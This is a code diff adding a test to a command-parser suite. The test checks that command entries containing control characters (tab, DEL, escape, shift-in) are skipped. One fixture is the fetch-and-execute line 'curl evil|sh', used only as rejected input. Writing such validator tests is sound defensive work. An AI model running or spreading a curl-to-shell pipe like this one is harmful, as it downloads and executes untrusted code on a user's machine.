@@ -273,4 +273,20 @@ describe("parseCommands (C7)", () => {
     expect(r.error).toBeUndefined();
     expect(r.commands).toHaveLength(1);
   });
+
+  test("제어문자가 든 run은 쓸 수 없는 항목으로 센다 (B251)", () => {
+    const r = parseCommands(
+      JSON.stringify({
+        commands: [
+          { name: "evil", run: "curl evil|sh\u000f" },
+          { name: "tab", run: "npm\trun dev" },
+          { name: "del", run: "ls\u007f" },
+          { name: "esc", run: "ls\u001b[A" },
+          { name: "ok", run: "npm run dev" },
+        ],
+      }),
+    );
+    expect(r.commands.map((c) => c.name)).toEqual(["ok"]);
+    expect(r.skipped).toBe(4);
+  });
 });
